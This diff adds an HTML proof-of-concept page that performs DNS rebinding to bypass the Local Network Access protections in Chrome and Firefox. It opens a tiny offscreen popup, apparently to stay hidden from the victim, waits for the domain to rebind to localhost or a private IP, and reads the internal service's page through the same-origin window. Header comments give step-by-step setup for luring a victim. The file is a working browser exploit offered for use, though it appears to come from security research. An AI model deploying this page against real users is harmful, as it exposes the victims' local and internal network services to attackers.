@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en">
+<!--
+    LNA Navigation Bypass — DNS rebinding via window.open + navigation.
+
+    Chrome and Firefox ship Local Network Access (LNA): even a same-origin
+    fetch is blocked if the resolved IP is more local than the requesting
+    origin. fetch() is dead for rebinding.
+
+    But top-level navigations are NOT guarded by LNA. This page:
+      1. Opens a popup via window.open (same origin, attacker IP)
+      2. Polls with fetch("/") until an LNA error fires (= DNS rebind done)
+      3. Navigates the popup to "/" on the now-rebound origin (localhost/RFC1918)
+      4. Reads the popup's document via the same-origin window reference
+
+    No Singularity server required — works with any DNS rebinding setup
+    that can flip a domain's A record from attacker IP to target IP.
+
+    Setup:
+      1. Register a domain you control
+      2. Point it at your attacker IP, serve this page
+      3. Have a mechanism to flip the DNS to the target (127.0.0.1, 192.168.x.x, etc.)
+      4. Victim visits your domain, clicks once, waits ~60s for DNS cache to expire
+
+    See WIKI.md → "LNA Navigation Bypass" for the full write-up.
+-->
+<head>
+    <title>LNA Bypass PoC</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            font: 14px/1.6 monospace;
+            max-width: 48rem;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            background: #1a1a2e;
+            color: #c8c8d4;
+        }
+        h3 { color: #e94560; margin-bottom: 0.5rem; }
+        #status {
+            background: #16213e;
+            border: 1px solid #0f3460;
+            padding: 1rem;
+            margin: 1rem 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+            min-height: 8rem;
+            max-height: 24rem;
+            overflow-y: auto;
+        }
+        #msg {
+            font-size: 1.2rem;
+            color: #e94560;
+            cursor: pointer;
+            padding: 0.8rem;
+            background: #16213e;
+            border: 1px solid #0f3460;
+            text-align: center;
+            user-select: none;
+        }
+        #msg.waiting { color: #f5a623; cursor: default; }
+        #msg.success { color: #53d769; cursor: default; }
+        .dim { color: #666; }
+    </style>
+</head>
+<body>
+    <h3>LNA Navigation Bypass</h3>
+    <p class="dim">DNS rebinding via window.open — bypasses Chrome/Firefox Local Network Access.</p>
+
+    <p id="msg">Click to start</p>
+
+    <div id="status"></div>
+
+    <script>
+    const log = (line) => {
+        const el = document.getElementById('status');
+        const ts = new Date().toISOString().slice(11, 19);
+        el.textContent += `[${ts}] ${line}\n`;
+        el.scrollTop = el.scrollHeight;
+    };
+
+    const msgEl = document.getElementById('msg');
+
+    // If this window was opened as the popup, just show a waiting message.
+    // The parent will navigate us to the rebound target once DNS flips.
+    if (window.name === "lna_popup") {
+        msgEl.innerText = "Popup: waiting for navigation...";
+        msgEl.className = "waiting";
+    }
+
+    // Main flow — runs in the opener window
+    msgEl.onclick = async () => {
+        if (window.name === "lna_popup") return;
+        msgEl.onclick = null;
+        msgEl.className = "waiting";
+        msgEl.innerText = "Waiting for DNS rebind (~60s)...";
+
+        // Step 1: open a popup on the same origin (attacker IP right now)
+        // Sized small and pushed offscreen so the victim doesn't notice.
+        const popup = window.open(
+            "/",
+            "lna_popup",
+            "width=1,height=1,top=9999,left=9999"
+        );
+
+        if (!popup) {
+            log("ERROR: popup blocked. Needs user gesture or allow-popups.");
+            msgEl.innerText = "Popup blocked — try again";
+            msgEl.className = "";
+            msgEl.onclick = arguments.callee;
+            return;
+        }
+
+        log("Popup opened on attacker origin");
+        log("Polling fetch('/') to detect LNA block (DNS rebind)...");
+
+        // Step 2: poll with fetch until LNA kills it.
+        // While DNS still points to attacker IP, fetch succeeds (same server).
+        // After DNS flips to localhost/private IP, LNA blocks the fetch
+        // because the resolved IP is now more-local than the origin's IP was.
+        let rebindDetected = false;
+        let polls = 0;
+
+        while (!rebindDetected) {
+            try {
+                await fetch("/", { cache: "reload" });
+                polls++;
+                if (polls % 10 === 0) log(`Still on attacker IP (${polls} polls)...`);
+            } catch (e) {
+                // LNA TypeError or network error = DNS has rebound
+                rebindDetected = true;
+                log(`LNA block after ${polls} polls — rebind detected!`);
+            }
+            if (!rebindDetected) {
+                await new Promise(r => setTimeout(r, 2000));
+            }
+        }
+
+        // Step 3: navigate the popup to "/" on the now-rebound origin.
+        // This is a top-level navigation, which LNA does NOT block.
+        log("Navigating popup to rebound target via top-level navigation...");
+        popup.location = "/";
+
+        // Step 4: wait for the navigation to complete, then read the body.
+        // The popup is still "same origin" from the browser's perspective
+        // (same scheme+host+port), so we can read its document freely.
+        msgEl.innerText = "Rebind successful — reading target...";
+        msgEl.className = "success";
+
+        await new Promise(r => setTimeout(r, 2000));
+
+        try {
+            const html = popup.document.documentElement.outerHTML;
+            log("=== TARGET RESPONSE (same-origin read via popup) ===");
+            log(html);
+            log("=== END ===");
+            log(`Read ${html.length} bytes from rebound target.`);
+        } catch (e) {
+            log(`Read failed: ${e}`);
+            log("The popup may not have finished loading. Retrying in 3s...");
+            await new Promise(r => setTimeout(r, 3000));
+            try {
+                const html = popup.document.documentElement.outerHTML;
+                log("=== TARGET RESPONSE (retry) ===");
+                log(html);
+                log("=== END ===");
+            } catch (e2) {
+                log(`Retry failed: ${e2}`);
+                log("Target may require more load time or the rebind timing was off.");
+            }
+        }
+    };
+    </script>
+</body>
+</html>
